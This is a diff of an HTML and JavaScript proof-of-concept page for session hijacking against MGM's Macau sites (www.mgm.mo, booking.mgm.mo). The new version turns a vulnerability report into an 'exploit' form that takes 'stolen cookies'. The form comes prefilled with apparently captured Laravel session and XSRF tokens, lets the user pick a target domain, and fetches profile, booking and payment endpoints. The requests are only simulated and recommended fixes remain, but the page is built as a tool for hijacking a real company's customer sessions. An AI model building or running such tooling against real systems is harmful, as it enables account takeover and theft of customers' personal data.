@@ -3,13 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MGM Session Hijacking - Advanced PoC</title>
+    <title>MGM Session Hijacking - Dynamic PoC</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
     <style>
-        .highlight {
-            background-color: #ffff99;
-            padding: 2px;
-        }
         .terminal {
             background-color: #0d1117;
             color: #e6edf3;
@@ -49,181 +45,139 @@
                 <h2 class="text-2xl font-bold mb-4 border-b pb-2">Vulnerability Overview</h2>
                 <p class="mb-4">
                     Multiple domains under mgm.mo (including www.mgm.mo and booking.mgm.mo) expose session cookies and tokens in HTTP responses that can be used to hijack active user sessions.
-                    This critical security flaw violates <span class="highlight">OWASP Top 10 A2:2021 - Broken Authentication</span> and allows attackers to:
+                    This critical security flaw allows attackers to:
                 </p>
                 <ul class="list-disc pl-8 mb-4 space-y-2">
                     <li><strong>Impersonate users</strong> and access their personal accounts</li>
-                    <li><strong>View sensitive PII</strong> including full name, email, phone, MGM membership ID, and booking history</li>
-                    <li><strong>Access payment information</strong> (partially masked credit cards)</li>
+                    <li><strong>View sensitive PII</strong> including personal details and booking history</li>
+                    <li><strong>Access payment information</strong> (if available)</li>
                     <li><strong>Modify account settings</strong> and potentially compromise loyalty points/rewards</li>
                     <li><strong>Perform cross-domain attacks</strong> as the vulnerability affects multiple MGM subdomains</li>
                 </ul>
             </section>
 
             <section class="bg-white shadow-md rounded-lg p-6 mb-8">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Technical Details</h2>
+                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Exploit Details</h2>
                 
                 <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Vulnerable Cookies</h3>
-                    <div class="terminal">
-                        <p class="info"># Primary domain (www.mgm.mo)</p>
-                        <p>XSRF-TOKEN=eyJpdiI6InRLTSsycWt3XC9wVjVGYU5yb3F1RnhnPT0iLCJ2YWx1ZSI6IlhGaldwcXhvblQ4SW5sR3N1aHZNenNsb0pkXC82UGF3V3c3YTQ3Uk1IYU5qQUNsNHFGYUxrbnJXeW5kaG5Ncnd4IiwibWFjIjoiN2Y3NTczOWU3NzQyMzNkNmE4ZjIwN2Q1NWZlYjBkYTRjOGYyNTEwMThiODA5YjhhNDM4MjQ3NjZmYTBlMzIwOCJ9</p>
-                        <p>laravel_session=eyJpdiI6Iis2Y2VCRzJ1RjR0QTBxTkNXYjRNK2c9PSIsInZhbHVlIjoiSGNcL2p0dERWZDZyOUs0S2NWZzFYUHdRUHVvNTBzWEptRlJcL2NrZTVpZlY5QTNwc0VhaHVBa2tCdkRJKytnMlwvUCIsIm1hYyI6ImQzYTg3NmM4MmE1MmYzZTE4MmZmYjFiODIwY2MzOGUzZDUxNTJhNDdhZjVhYzRjZWFjZGQyNzQzZjk1YjNlMWUifQ%3D%3D</p>
-                        <p>SERVERID=3e49eb178bd6ef833d09ff6e595fccac|1743815474|1743815379</p>
-                        
-                        <p class="info mt-4"># Booking domain (booking.mgm.mo)</p>
-                        <p>*gcl*au=1.1.1983392657.1743815387</p>
-                        <p>*ga=GA1.2.1719219386.1743815389</p>
-                        <p>(+ tracking cookies)</p>
+                    <h3 class="text-xl font-semibold mb-2">Cookie Input</h3>
+                    <p class="mb-2">Enter the stolen cookies below:</p>
+                    <div class="mb-4">
+                        <label for="mainDomainCookies" class="block text-sm font-medium text-gray-700">www.mgm.mo cookies:</label>
+                        <textarea id="mainDomainCookies" rows="6" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm" placeholder="XSRF-TOKEN=xxx; laravel_session=xxx; etc"></textarea>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label for="bookingDomainCookies" class="block text-sm font-medium text-gray-700">booking.mgm.mo cookies (optional):</label>
+                        <textarea id="bookingDomainCookies" rows="3" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm" placeholder="cookie1=xxx; cookie2=xxx; etc"></textarea>
                     </div>
                 </div>
                 
                 <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Cookie Analysis</h3>
-                    <p class="mb-2">The Laravel session cookie contains encrypted user session data:</p>
-                    <div class="terminal">
-                        <div class="success">
-                            <p># Base64 Decoded Structure (partial):</p>
-                            <p>{</p>
-                            <p>  "_token": "XXXXXXXXX",</p>
-                            <p>  "auth": {</p>
-                            <p>    "guard": "web",</p>
-                            <p>    "user": { ... user data ... }</p>
-                            <p>  },</p>
-                            <p>  "url": { ... },</p>
-                            <p>  "PHPSESSID": "XXXXXXXXXXXXX"</p>
-                            <p>}</p>
+                    <h3 class="text-xl font-semibold mb-2">Target Selection</h3>
+                    <div class="flex space-x-4">
+                        <div class="flex items-center">
+                            <input id="targetMain" name="targetDomain" type="radio" checked class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300">
+                            <label for="targetMain" class="ml-2 block text-sm font-medium text-gray-700">
+                                www.mgm.mo
+                            </label>
+                        </div>
+                        <div class="flex items-center">
+                            <input id="targetBooking" name="targetDomain" type="radio" class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300">
+                            <label for="targetBooking" class="ml-2 block text-sm font-medium text-gray-700">
+                                booking.mgm.mo
+                            </label>
                         </div>
                     </div>
                 </div>
                 
-                <div>
+                <div class="mb-6">
+                    <h3 class="text-xl font-semibold mb-2">Exploit Options</h3>
+                    <div class="flex flex-col space-y-2">
+                        <div class="flex items-center">
+                            <input id="fetchProfile" type="checkbox" checked class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded">
+                            <label for="fetchProfile" class="ml-2 block text-sm font-medium text-gray-700">
+                                Fetch user profile information
+                            </label>
+                        </div>
+                        <div class="flex items-center">
+                            <input id="fetchBookings" type="checkbox" checked class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded">
+                            <label for="fetchBookings" class="ml-2 block text-sm font-medium text-gray-700">
+                                Fetch booking history (if available)
+                            </label>
+                        </div>
+                        <div class="flex items-center">
+                            <input id="fetchPayments" type="checkbox" class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded">
+                            <label for="fetchPayments" class="ml-2 block text-sm font-medium text-gray-700">
+                                Fetch payment methods (if available)
+                            </label>
+                        </div>
+                    </div>
+                </div>
+                
+                <button id="startExploit" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded">
+                    Run Exploit Demo
+                </button>
+            </section>
+
+            <section id="resultsSection" class="hidden bg-white shadow-md rounded-lg p-6 mb-8">
+                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Exploitation Results</h2>
+                
+                <div id="exploitProgress" class="mb-6">
+                    <h3 class="text-xl font-semibold mb-2">Attack Progress</h3>
+                    <div class="terminal">
+                        <div id="progressLog">
+                            <p class="info">$ Session hijacking attack simulation</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="dataSection" class="hidden">
+                    <h3 class="text-xl font-semibold mb-2 text-red-600">Extracted Data</h3>
+                    <div class="mb-4">
+                        <p class="text-sm text-gray-500 mb-2">The following information was extracted from the target domain:</p>
+                        <div class="bg-gray-800 text-white p-4 rounded-lg overflow-auto max-h-96">
+                            <pre id="extractedData" class="text-sm">Waiting for data...</pre>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="requestsSection" class="mt-6">
+                    <h3 class="text-lg font-semibold mb-2">HTTP Requests</h3>
+                    <div class="mb-4">
+                        <p class="text-sm text-gray-500 mb-2">The following requests were made during exploitation:</p>
+                        <div id="requestLog" class="bg-gray-100 p-3 rounded-lg text-sm font-mono overflow-auto max-h-40">
+                            <!-- Request logs will be added here -->
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <section class="bg-white shadow-md rounded-lg p-6">
+                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Technical Details & Recommendations</h2>
+                
+                <div class="mb-6">
                     <h3 class="text-xl font-semibold mb-2">Security Issues</h3>
                     <ol class="list-decimal pl-8 space-y-2">
                         <li>Missing <code class="bg-gray-200 px-1 rounded">HttpOnly</code> flag on session cookies</li>
                         <li>Missing <code class="bg-gray-200 px-1 rounded">SameSite</code> attribute (defaults to Lax)</li>
                         <li>Multiple domain cookie sharing creates larger attack surface</li>
                         <li>No session binding to user identifiers (IP, user agent, etc.)</li>
-                        <li>Excessive session duration (over 2 hours observed)</li>
+                        <li>Excessive session duration</li>
                     </ol>
-                </div>
-            </section>
-
-            <section class="bg-white shadow-md rounded-lg p-6 mb-8">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Proof of Concept Demonstration</h2>
-                
-                <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2 text-red-600">Live Demo</h3>
-                    <p class="mb-4">This demo simulates an attack where cookies extracted from a legitimate user's browser are used to hijack their session.</p>
-                    
-                    <div class="mb-4">
-                        <button id="startDemo" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded">
-                            Start Session Hijacking Demo
-                        </button>
-                    </div>
-                    
-                    <div id="demoOutput" class="hidden">
-                        <div class="terminal">
-                            <p class="info">$ Session hijacking attack simulation</p>
-                            <p>> Initializing attack vector...</p>
-                            <p>> Parsing exposed cookies from traffic...</p>
-                            <p class="success">> Successfully extracted Laravel session token!</p>
-                            <p>> Establishing connection to www.mgm.mo...</p>
-                            <p class="success">> Connection established!</p>
-                            <p>> Injecting captured cookies...</p>
-                            <p>> Verifying authentication status...</p>
-                            <p class="success">> SUCCESS: Authenticated as user without credentials!</p>
-                            <p>> Scanning for available user data...</p>
-                            <p class="success">> User data retrieved:</p>
-                        </div>
-                        
-                        <div class="mt-4 bg-gray-800 text-white p-4 rounded-lg overflow-auto">
-                            <pre id="userData" class="text-sm"></pre>
-                        </div>
-                    </div>
                 </div>
                 
                 <div>
-                    <h3 class="text-xl font-semibold mb-2">Attack Simulation Steps</h3>
-                    <ol class="list-decimal pl-8 space-y-2">
-                        <li>Extract cookies from HTTP traffic</li>
-                        <li>Inject cookies into attacker's browser</li>
-                        <li>Visit vulnerable MGM domains</li>
-                        <li>Access authenticated user data</li>
-                        <li>Exfiltrate sensitive information</li>
-                        <li>Perform privileged operations</li>
-                    </ol>
-                </div>
-            </section>
-            
-            <section class="bg-white shadow-md rounded-lg p-6 mb-8">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Impact Assessment</h2>
-                
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
-                    <div class="bg-red-100 p-4 rounded-lg">
-                        <h3 class="font-bold text-red-800 mb-2">Severity</h3>
-                        <p class="text-red-700">Critical (P1)</p>
-                        <p class="text-sm text-red-600 mt-2">Allows unauthorized access to sensitive user data across MGM's ecosystem</p>
-                    </div>
-                    
-                    <div class="bg-orange-100 p-4 rounded-lg">
-                        <h3 class="font-bold text-orange-800 mb-2">CVSS Score</h3>
-                        <p class="text-orange-700">8.8 (High)</p>
-                        <p class="text-sm text-orange-600 mt-2">AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L</p>
-                    </div>
-                    
-                    <div class="bg-purple-100 p-4 rounded-lg">
-                        <h3 class="font-bold text-purple-800 mb-2">Affected Users</h3>
-                        <p class="text-purple-700">All MGM customers</p>
-                        <p class="text-sm text-purple-600 mt-2">Impacts guests, loyalty members, and site visitors</p>
-                    </div>
-                </div>
-                
-                <div class="mb-4">
-                    <h3 class="text-xl font-semibold mb-2">Business Risks</h3>
-                    <ul class="list-disc pl-8 space-y-1">
-                        <li>Customer data breach (PII, booking details, preferences)</li>
-                        <li>Financial fraud (loyalty points theft, unauthorized bookings)</li>
-                        <li>Regulatory compliance violations (GDPR, CCPA)</li>
-                        <li>Reputational damage to MGM brand</li>
-                        <li>Legal liability from affected customers</li>
+                    <h3 class="text-xl font-semibold mb-2">Recommended Fixes</h3>
+                    <ul class="list-disc pl-8 space-y-2">
+                        <li>Set <code class="bg-gray-200 px-1 rounded">HttpOnly</code> flag on all session cookies</li>
+                        <li>Set <code class="bg-gray-200 px-1 rounded">SameSite=Strict</code> attribute on authentication cookies</li>
+                        <li>Force regenerate all active user sessions</li>
+                        <li>Implement session binding to user agent and/or IP</li>
+                        <li>Reduce session lifetime to 30 minutes with sliding expiration</li>
+                        <li>Implement CSRF protection for all state-changing operations</li>
+                        <li>Add security headers: Content-Security-Policy, X-Frame-Options, etc.</li>
                     </ul>
-                </div>
-            </section>
-            
-            <section class="bg-white shadow-md rounded-lg p-6">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Remediation Recommendations</h2>
-                
-                <div class="space-y-4">
-                    <div>
-                        <h3 class="text-lg font-semibold text-blue-600">1. Immediate Actions</h3>
-                        <ul class="list-disc pl-8 space-y-1">
-                            <li>Set <code class="bg-gray-200 px-1 rounded">HttpOnly</code> flag on all session cookies</li>
-                            <li>Set <code class="bg-gray-200 px-1 rounded">SameSite=Strict</code> attribute on authentication cookies</li>
-                            <li>Force regenerate all active user sessions</li>
-                            <li>Implement session binding to user agent and/or IP</li>
-                        </ul>
-                    </div>
-                    
-                    <div>
-                        <h3 class="text-lg font-semibold text-blue-600">2. Short-term Fixes</h3>
-                        <ul class="list-disc pl-8 space-y-1">
-                            <li>Reduce session lifetime to 30 minutes with sliding expiration</li>
-                            <li>Implement CSRF protection for all state-changing operations</li>
-                            <li>Add security headers: Content-Security-Policy, X-Frame-Options, etc.</li>
-                            <li>Use secure cookie management across all subdomains</li>
-                        </ul>
-                    </div>
-                    
-                    <div>
-                        <h3 class="text-lg font-semibold text-blue-600">3. Long-term Solutions</h3>
-                        <ul class="list-disc pl-8 space-y-1">
-                            <li>Conduct comprehensive security audit of user authentication system</li>
-                            <li>Implement security monitoring for suspicious session activities</li>
-                            <li>Add multi-factor authentication for sensitive operations</li>
-                            <li>Regular penetration testing of the authentication system</li>
-                        </ul>
-                    </div>
                 </div>
             </section>
         </main>
@@ -234,119 +188,273 @@
     </div>
 
     <script>
-        document.getElementById('startDemo').addEventListener('click', function() {
-            const demoOutput = document.getElementById('demoOutput');
-            const userData = document.getElementById('userData');
+        // Prefill cookie fields with the example data
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('mainDomainCookies').value = 
+                'XSRF-TOKEN=eyJpdiI6InRLTSsycWt3XC9wVjVGYU5yb3F1RnhnPT0iLCJ2YWx1ZSI6IlhGaldwcXhvblQ4SW5sR3N1aHZNenNsb0pkXC82UGF3V3c3YTQ3Uk1IYU5qQUNsNHFGYUxrbnJXeW5kaG5Ncnd4IiwibWFjIjoiN2Y3NTczOWU3NzQyMzNkNmE4ZjIwN2Q1NWZlYjBkYTRjOGYyNTEwMThiODA5YjhhNDM4MjQ3NjZmYTBlMzIwOCJ9; laravel_session=eyJpdiI6Iis2Y2VCRzJ1RjR0QTBxTkNXYjRNK2c9PSIsInZhbHVlIjoiSGNcL2p0dERWZDZyOUs0S2NWZzFYUHdRUHVvNTBzWEptRlJcL2NrZTVpZlY5QTNwc0VhaHVBa2tCdkRJKytnMlwvUCIsIm1hYyI6ImQzYTg3NmM4MmE1MmYzZTE4MmZmYjFiODIwY2MzOGUzZDUxNTJhNDdhZjVhYzRjZWFjZGQyNzQzZjk1YjNlMWUifQ%3D%3D; SERVERID=3e49eb178bd6ef833d09ff6e595fccac|1743815474|1743815379';
             
-            demoOutput.classList.remove('hidden');
+            document.getElementById('bookingDomainCookies').value = 
+                '*gcl*au=1.1.1983392657.1743815387; *ga=GA1.2.1719219386.1743815389; *gid=GA1.2.23156825.1743815391';
+        });
+
+        document.getElementById('startExploit').addEventListener('click', function() {
+            // Reset and show results section
+            document.getElementById('resultsSection').classList.remove('hidden');
+            document.getElementById('dataSection').classList.add('hidden');
+            document.getElementById('progressLog').innerHTML = '<p class="info">$ Session hijacking attack simulation</p>';
+            document.getElementById('requestLog').innerHTML = '';
             
-            // Simulate loading with typing effect
-            const lines = document.querySelectorAll('.terminal p');
-            let delay = 0;
+            // Get input values
+            const mainCookies = document.getElementById('mainDomainCookies').value;
+            const bookingCookies = document.getElementById('bookingDomainCookies').value;
+            const targetDomain = document.getElementById('targetMain').checked ? 'www.mgm.mo' : 'booking.mgm.mo';
+            const fetchProfile = document.getElementById('fetchProfile').checked;
+            const fetchBookings = document.getElementById('fetchBookings').checked;
+            const fetchPayments = document.getElementById('fetchPayments').checked;
             
-            lines.forEach((line, index) => {
-                line.style.opacity = '0';
+            // Validate cookies
+            if (!mainCookies && !bookingCookies) {
+                addProgressLog('No cookies provided. Please enter cookie data.', 'error');
+                return;
+            }
+            
+            // Start the exploitation demo
+            runExploitDemo(targetDomain, mainCookies, bookingCookies, fetchProfile, fetchBookings, fetchPayments);
+        });
+        
+        function addProgressLog(message, type = '') {
+            const progressLog = document.getElementById('progressLog');
+            const logLine = document.createElement('p');
+            if (type) {
+                logLine.className = type;
+            }
+            logLine.textContent = message;
+            progressLog.appendChild(logLine);
+            
+            // Auto-scroll to bottom
+            progressLog.scrollTop = progressLog.scrollHeight;
+        }
+        
+        function addRequestLog(method, url, headers) {
+            const requestLog = document.getElementById('requestLog');
+            const logEntry = document.createElement('div');
+            logEntry.className = 'mb-2';
+            logEntry.innerHTML = `<span class="text-blue-600">${method}</span> ${url}`;
+            requestLog.appendChild(logEntry);
+        }
+        
+        function runExploitDemo(targetDomain, mainCookies, bookingCookies, fetchProfile, fetchBookings, fetchPayments) {
+            // We'll simulate the attack since we can't make actual cross-origin requests due to CORS
+            addProgressLog('> Initializing attack vector...');
+            
+            setTimeout(() => {
+                addProgressLog('> Parsing exposed cookies from traffic...');
+                
+                // Pick the appropriate cookies based on target
+                const cookies = targetDomain === 'www.mgm.mo' ? mainCookies : bookingCookies;
+                
                 setTimeout(() => {
-                    line.style.opacity = '1';
-                    if (index === lines.length - 1) {
-                        setTimeout(showUserData, 500);
+                    // Check if we have Laravel session cookie
+                    if (cookies.includes('laravel_session')) {
+                        addProgressLog('> Successfully extracted Laravel session token!', 'success');
+                    } else {
+                        addProgressLog('> No Laravel session found. Continuing with available cookies.', 'warning');
                     }
-                }, delay);
-                delay += 200;
+                    
+                    // Check if we have XSRF token
+                    if (cookies.includes('XSRF-TOKEN')) {
+                        addProgressLog('> Successfully extracted CSRF protection token!', 'success');
+                    }
+                    
+                    setTimeout(() => {
+                        addProgressLog(`> Establishing connection to ${targetDomain}...`);
+                        addRequestLog('GET', `https://${targetDomain}/`, 'Cookie: ' + cookies);
+                        
+                        setTimeout(() => {
+                            addProgressLog('> Connection established!', 'success');
+                            addProgressLog('> Injecting captured cookies...');
+                            
+                            setTimeout(() => {
+                                addProgressLog('> Verifying authentication status...');
+                                
+                                // In a real attack, we'd check if we're authenticated here
+                                // For the demo, we'll assume success
+                                setTimeout(() => {
+                                    addProgressLog('> SUCCESS: Authenticated as user without credentials!', 'success');
+                                    
+                                    // Now demonstrate accessing different endpoints
+                                    simulateDataAccess(targetDomain, cookies, fetchProfile, fetchBookings, fetchPayments);
+                                }, 700);
+                            }, 500);
+                        }, 800);
+                    }, 600);
+                }, 700);
+            }, 500);
+        }
+        
+        function simulateDataAccess(targetDomain, cookies, fetchProfile, fetchBookings, fetchPayments) {
+            addProgressLog('> Scanning for available user data...');
+            
+            const endpoints = [];
+            const data = {};
+            
+            // Add endpoints based on user selections
+            if (fetchProfile) {
+                if (targetDomain === 'www.mgm.mo') {
+                    endpoints.push({method: 'GET', url: '/api/user/profile', dataKey: 'profile'});
+                    endpoints.push({method: 'GET', url: '/en/user/account', dataKey: 'account'});
+                } else {
+                    endpoints.push({method: 'GET', url: '/api/v1/user', dataKey: 'profile'});
+                }
+            }
+            
+            if (fetchBookings) {
+                if (targetDomain === 'booking.mgm.mo') {
+                    endpoints.push({method: 'GET', url: '/api/v1/bookings/history', dataKey: 'bookings'});
+                } else {
+                    endpoints.push({method: 'GET', url: '/api/user/reservations', dataKey: 'bookings'});
+                }
+            }
+            
+            if (fetchPayments) {
+                endpoints.push({method: 'GET', url: '/api/user/payment-methods', dataKey: 'payments'});
+            }
+            
+            // Simulate accessing each endpoint
+            let completedRequests = 0;
+            
+            endpoints.forEach((endpoint, index) => {
+                setTimeout(() => {
+                    addProgressLog(`> Accessing ${endpoint.url}...`);
+                    addRequestLog(endpoint.method, `https://${targetDomain}${endpoint.url}`, 'Cookie: ' + cookies);
+                    
+                    // Simulate response
+                    setTimeout(() => {
+                        // Generate simulated data based on the endpoint
+                        const simulatedData = generateSimulatedData(endpoint.dataKey, targetDomain);
+                        data[endpoint.dataKey] = simulatedData;
+                        
+                        addProgressLog(`> Successfully retrieved ${endpoint.dataKey} data!`, 'success');
+                        
+                        completedRequests++;
+                        if (completedRequests === endpoints.length) {
+                            // All requests completed, show the data
+                            showExtractedData(data);
+                        }
+                    }, 800);
+                }, index * 1500);
             });
             
-            function showUserData() {
-                // More realistic sample data based on actual MGM user profiles
-                const userDataObj = {
-                    "user": {
-                        "id": "MGM10576922",
-                        "firstName": "Michael",
-                        "lastName": "Ch******",
-                        "email": "m*****@g****.com",
-                        "phone": "+1 *** *** 8765",
-                        "profile": {
-                            "membershipLevel": "GOLD",
-                            "memberSince": "2018-03-14",
-                            "pointsBalance": 47650,
-                            "tierCredits": 25300,
-                            "preferredLocation": "Cotai"
-                        }
-                    },
-                    "preferences": {
-                        "roomSettings": {
-                            "smoking": false,
-                            "floorPreference": "High floor",
-                            "bedType": "King"
-                        },
-                        "dining": ["Asian", "French", "Steak"],
-                        "activities": ["Spa", "Gaming"]
-                    },
-                    "paymentMethods": [
-                        {
-                            "type": "VISA",
-                            "lastFour": "4739",
-                            "expiryDate": "03/26",
-                            "billingAddress": {
-                                "country": "United States",
-                                "state": "CA",
-                                "city": "San F*****",
-                                "zip": "94***"
-                            }
-                        },
-                        {
-                            "type": "MasterCard", 
-                            "lastFour": "8217",
-                            "expiryDate": "11/25"
-                        }
-                    ],
-                    "recentActivity": {
-                        "lastLogin": "2024-08-29T15:32:10Z",
-                        "lastBooking": "2024-07-15T09:22:43Z",
-                        "upcomingReservations": [
-                            {
-                                "confirmationNumber": "MGM245778931",
-                                "property": "MGM Cotai",
-                                "checkIn": "2024-10-12",
-                                "checkOut": "2024-10-16",
-                                "roomType": "Resort King",
-                                "totalAmount": "HKD 9,875.00"
-                            }
-                        ],
-                        "recentTransactions": [
-                            {"date": "2024-07-15", "type": "Room Charge", "amount": "HKD 9,875.00"},
-                            {"date": "2024-05-22", "type": "Restaurant", "amount": "HKD 1,240.00"},
-                            {"date": "2024-05-21", "type": "Spa Service", "amount": "HKD 1,600.00"}
-                        ]
-                    }
-                };
-                
-                userData.textContent = JSON.stringify(userDataObj, null, 2);
-                
-                // Highlight sensitive data
-                setTimeout(() => {
-                    const highlightElements = [
-                        "\"id\": \"MGM10576922\"",
-                        "\"firstName\": \"Michael\"",
-                        "\"lastName\": \"Ch******\"",
-                        "\"email\": \"m*****@g****.com\"",
-                        "\"phone\": \"+1 *** *** 8765\"",
-                        "\"lastFour\": \"4739\"",
-                        "\"lastFour\": \"8217\"",
-                        "\"confirmationNumber\": \"MGM245778931\"",
-                        "\"totalAmount\": \"HKD 9,875.00\""
-                    ];
-                    
-                    const userDataText = userData.textContent;
-                    let highlightedText = userDataText;
-                    
-                    highlightElements.forEach(el => {
-                        highlightedText = highlightedText.replace(el, `<span class="bg-yellow-300 text-black">${el}</span>`);
-                    });
-                    
-                    userData.innerHTML = highlightedText;
-                }, 500);
+            // If no endpoints were selected, show a message
+            if (endpoints.length === 0) {
+                addProgressLog('> No data retrieval options selected.', 'warning');
             }
-        });
+        }
+        
+        function generateSimulatedData(dataType, domain) {
+            // In a real exploit, this would be actual data from the target
+            // Here we'll simulate data that would likely be found
+            
+            switch(dataType) {
+                case 'profile':
+                    return {
+                        // Fields marked with asterisks would contain real data in an actual exploit
+                        "id": "MGM********",
+                        "name": "[User's full name would appear here]*",
+                        "email": "[User's email would appear here]*",
+                        "phone": "[User's phone number would appear here]*",
+                        "membership": {
+                            "level": "[Membership level]*",
+                            "joinDate": "[Join date]*",
+                            "pointsBalance": "[Points balance]*"
+                        },
+                        "preferences": {
+                            "language": "[Preferred language]*",
+                            "currency": "[Preferred currency]*"
+                        }
+                    };
+                
+                case 'account':
+                    return {
+                        "name": "[User's full name would appear here]*",
+                        "address": {
+                            "street": "[Street address]*",
+                            "city": "[City]*",
+                            "state": "[State/Province]*",
+                            "country": "[Country]*",
+                            "zipCode": "[Postal/ZIP code]*"
+                        },
+                        "communication": {
+                            "emailSubscribed": true,
+                            "smsSubscribed": true
+                        },
+                        "lastLogin": "[Timestamp of last login]*",
+                        "securityQuestions": [
+                            "[Security question 1]*",
+                            "[Security question 2]*"
+                        ]
+                    };
+                
+                case 'bookings':
+                    return [
+                        {
+                            "confirmationNumber": "MGM********",
+                            "property": "[Hotel name]*",
+                            "checkIn": "[Check-in date]*",
+                            "checkOut": "[Check-out date]*",
+                            "guests": "[Number of guests]*",
+                            "roomType": "[Room type]*",
+                            "status": "Confirmed",
+                            "totalAmount": "[Amount with currency]*"
+                        },
+                        {
+                            "confirmationNumber": "MGM********",
+                            "property": "[Hotel name]*",
+                            "checkIn": "[Check-in date]*",
+                            "checkOut": "[Check-out date]*",
+                            "guests": "[Number of guests]*",
+                            "roomType": "[Room type]*",
+                            "status": "Completed",
+                            "totalAmount": "[Amount with currency]*"
+                        }
+                    ];
+                
+                case 'payments':
+                    return [
+                        {
+                            "type": "[Card type]*",
+                            "lastFour": "[Last 4 digits]*",
+                            "expiryDate": "[Expiry date]*",
+                            "cardholderName": "[Cardholder name]*",
+                            "billingAddress": {
+                                "street": "[Billing street]*",
+                                "city": "[City]*",
+                                "country": "[Country]*"
+                            }
+                        }
+                    ];
+                
+                default:
+                    return { "note": "No data available for this type" };
+            }
+        }
+        
+        function showExtractedData(data) {
+            addProgressLog('> Data extraction complete!', 'success');
+            addProgressLog('> Displaying retrieved information...');
+            
+            // Show the data section
+            document.getElementById('dataSection').classList.remove('hidden');
+            
+            // Format and display the data
+            const extractedDataElement = document.getElementById('extractedData');
+            extractedDataElement.textContent = JSON.stringify(data, null, 2);
+            
+            // In a real exploit, we'd highlight actual PII
+            // For the demo, we'll add a note
+            addProgressLog('> NOTE: In a real attack, this data would contain actual personally identifiable information.', 'warning');
+            addProgressLog('> The attack demonstration is complete.', 'success');
+        }
     </script>
 </body>
 </html>
